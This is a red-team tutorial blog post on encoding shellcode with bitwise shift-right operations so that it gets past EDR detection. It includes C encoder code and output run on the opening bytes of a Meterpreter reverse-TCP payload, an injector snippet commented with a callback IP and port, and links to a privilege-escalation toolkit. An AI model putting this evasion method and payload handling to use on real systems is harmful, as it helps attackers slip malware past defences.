---
title:  "How to use Bitwise Arithmetic Shift Right Encoding with your Shellcode"
header:
  teaser: "/assets/images/samhashdetect.png"
categories:
  - Encoding
tags:
  - bitwise
  - xor
  - shift right
  - shift left
  - and
  - or
  - encoding
  - encryption
  - red team
  - shellcode
  - elevationstation
---

You have likely seen various forms of shellcode encoders in use via your favorite C2 toolkit.  I'm oldschool and started my shellcode encoding experience using the built-in encoding technique called Shikata ga nai within the Metasploit C2 Framework.  

Today our focus on encoding techniques will not be as sophisticaed.  I'm going to take us all the way back to the primitive forms of encoding that have been around for a very long time, and guess what...they are still effective against bypassing EDR solutions even now as I write this in 2023!

**Bitwise Arithmetic Operations - 101**
-

Bitwise arithmetic, for our purposes, happens at the base 2 binary level.  Below are examples of each (I include the common and most practical Bitwise methods only):
```
2^7 2^6 2^5 2^4 2^3 2^2 2^1 2^0
1   6   3   1   8   4   2   1
2   4   2   6
8
```

**Bitwise AND (if both numbers are a 1, the result is a 1)**

```
1 6 3 1 8 4 2 1
2 4 2 6
8           

0 0 1 1 0 0 0 0 (Decimal 48)
0 1 1 1 0 0 1 0 (Decimal 114)
===============
0 0 1 1 0 0 0 0 (Decimal 48)
```

**Bitwise OR (if either number is a 1, the result is a 1)**

```
1 6 3 1 8 4 2 1
2 4 2 6
8           

0 0 1 1 0 0 0 0 (Decimal 48)
0 1 1 1 0 0 1 0 (Decimal 114)
===============
0 1 1 1 0 0 1 0 (Decimal 114)
```

**Bitwise XOR (if the two numbers are different, the result is a 1)**

```
1 6 3 1 8 4 2 1
2 4 2 6
8           

0 0 1 1 0 0 0 0 (Decimal 48)
0 1 1 1 0 0 1 0 (Decimal 114)
===============
0 1 0 0 0 0 1 0 (Decimal 66)
```

**Bitwise Shift Left (takes a number and shifts it left by the value provided.  In this case, we are only shifting by 1)**

```
1 6 3 1 8 4 2 1
2 4 2 6
8           

0 0 1 1 0 0 0 0 (Decimal 48)

===============
0 1 1 0 0 0 0 0 (Decimal 96)
```

**Bitwise Shift Right (takes a number and shifts it right by the value provided.  In this case, we are only shifting by 1)**

```
1 6 3 1 8 4 2 1
2 4 2 6
8           

0 0 1 1 0 0 0 0 (Decimal 48)

===============
0 0 0 1 1 0 0 0 (Decimal 24)
```

Now that you have a reference for each Bitwise operation, Let's explore encoding our shellcode using the Shift Right Method.  The code skeleton below showcases the first few bytes of a basic Meterpreter x64 reverse tcp shellcode:

```c++
g3tsyst3m@debian:~$ cat bitwiseencoder.c
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{

	unsigned char b33fy[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
```

xFC = 252 in decimal

```
1 1 1 1 1 1 0 0
```

Now, left's shift that right by 1

```
1 1 1 1 1 1 0 0 (HEX = xFC)

0 1 1 1 1 1 1 0 (HEX = x7E, shifted by 1 to the right)
```

If we look at the Inj3ct0r function in `elevationstation.cpp`, we see the first hexvalue is in fact encoded as \x7E

```cpp
bool Inj3ct0r(DWORD pid)
{
    //bitwise shift right encoding method
    //ip: 192.168.1.50
    //port: 4445
    unsigned char b33fy[] =
    -->  "\x7e  <--   \x24\x41\x72\x78\x74\x60\x0\x0\x0\x20\x28\x20\x28"
```

Fairly straight forward right?  Not so fast.  You'll likely recall that when we shifted right or left, a zero must go where there was previously a 1.  Well, we have to keep track of that in our encoding routine

Why do we have to keep track of it you ask?  Consider the third hex value in our shellcode char array: \x83  <-- \xfc\x48\x83. 

`1 0 0 0 0 0 1 1 = x83`

If you shift that to the right, you get this, which makes sense.  The sevens position (2^7) moves to the 2^6 position.  The two's position (2^1) shifts right and replaces the 2^0 position.  The final one's position (2^0), 1, moves to the right and into what could be considered the negative range.  So the encoding went great!

`0 1 0 0 0 0 0 1 = x41`

The problem lies in the decoding routine...since we're missing that 1 that was previously in the ones position (2^0) and now in the "negative position".  If you shift left to get the original value, you'll see what I mean;  you fall short by 1.  Let's try it:

`1 0 0 0 0 0 1 0 = x82 (NOT x83 as we hoped for)`

So, how do we make it so we account for the missing '1' to add up to x83?  Just perform an AND bitwise operation against your original value with 1 and if it returns 0, that means you won't have to account for a missing '1' value since the AND bitwise operation confirmed there were not two 1s present in the one's position (2^0).  If there are two 1s present in the one's position (2^0), your AND will return a 1 and that means you have to add 1 to your final decoded value. 
I keep track of all the 1s and 0s in a separate array which is used in the code for the decode routine.

I demonstrate everything below using the example above of x83 and xFC as the original hex value.  Please see the comments throughout the code:

```cpp
for (int b = 0; b < lenny - 1; b++)
	{
		printf("==================================\n");
		printf("original: x%02hhx\n", b33fy[b]);  \\ \x83
		printf("shiftright: x%02hhx\n", b33fy[b] >> 1); \\ \x41
		shiftright[b] = b33fy[b] >> 1;

		shifted[b] = b33fy[b] >> 1;
		if ((b33fy[b] & 1) == 1)
		{
      //Example:
      //1 0 0 0 0 0 1 1 \x83 (decimal 131)
      //0 0 0 0 0 0 0 1 \x01 (decimal 1...of course 😸 )
      //===============
      //0 0 0 0 0 0 0 1 = 1

			printf("1\n");
			onesnzeros[b] = 1;
			shifted[b] = (shifted[b] << 1) + 1; //add 1 to decoded value
		}
		else
		{
      //Example for returning 0:
      //1 1 1 1 1 1 0 0 \xFC (decimal 252)
      //0 0 0 0 0 0 0 1 \x01 (decimal 1...of course 😸 )
      //===============
      //0 0 0 0 0 0 0 0 = 0

			printf("0\n");
			onesnzeros[b] = 0;
			shifted[b] = (shifted[b] << 1); //don't add 1 and leave as is
		}
		printf("back to original (shleft): x%02hhx\n", shifted[b]);
		printf("==================================\n");

	}
```

here's the result of running our modified bitwiseencoder.c encoder code used in this walkthrough:

```
g3tsyst3m@debian:~$ ./backup_bitwiseencoder 
==================================
original: xfc
shiftright: x7e
0
back to original (shleft): xfc
==================================
==================================
original: x48
shiftright: x24
0
back to original (shleft): x48
==================================
==================================
original: x83
shiftright: x41
1
back to original (shleft): x83
==================================
==================================
original: xe4
shiftright: x72
0
back to original (shleft): xe4
==================================
==================================
original: xf0
shiftright: x78
0
back to original (shleft): xf0
==================================
==================================
original: xe8
shiftright: x74
0
back to original (shleft): xe8
==================================
==================================
original: xc0
shiftright: x60
0
back to original (shleft): xc0
==================================
==================================
original: x00
shiftright: x00
0
back to original (shleft): x00
==================================
==================================
original: x00
shiftright: x00
0
back to original (shleft): x00
==================================
==================================
original: x00
shiftright: x00
0
back to original (shleft): x00
==================================
==================================
original: x41
shiftright: x20
1
back to original (shleft): x41
==================================
==================================
original: x51
shiftright: x28
1
back to original (shleft): x51
==================================
==================================
original: x41
shiftright: x20
1
back to original (shleft): x41
==================================
==================================
original: x50
shiftright: x28
0
back to original (shleft): x50
==================================
final encoded s h 3 ! ! c 0 d 3: 

char b33fy[] = 
"\x7e\x24\x41\x72\x78\x74\x60\x0\x0\x0\x20\x28\x20\x28";

unsigned int onesnzeros[] = 

{0,0,1,0,0,0,0,0,0,0,1,1,1,0};
```

The bitwiseencoder program generates the final encoded shellcode, and that is what you would paste into the top of the bitwisedecoder.c code or in the elevationstation Inj3ct0r function:

```
char b33fy[] = 
"\x7e\x24\x41\x72\x78\x74\x60\x0\x0\x0\x20\x28\x20\x28";

unsigned int onesnzeros[] = 

{0,0,1,0,0,0,0,0,0,0,1,1,1,0};
```

Go here for both the encoding and decoding c files used in this walkthrough: [bitwise files](https://github.com/g3tsyst3m/elevationstation/tree/main/bitwisestuff)

And if you'd like to explore the decode routine used in an actual toolkit, checkout my privilege escalation toolkit Elevation Station:
[elevation station code](https://github.com/g3tsyst3m/elevationstation/tree/main/elevationstation)

You'll find the shift left decode routine in the Inj3ct0r function within the code as stated previously, and this is one of many methods used to escalate privileges to SYSTEM.  In the case of this function, using CreateRemoteThread API.

I hope this has shed some light on encoding using bitwise operations and how you can fairly easily encode shellcode with it.  I've enjoyed learning about this simple method of encoding and decoding and I hope it helps in your red team engagements and provides more awareness for blue teamers.  Thanks and bye!
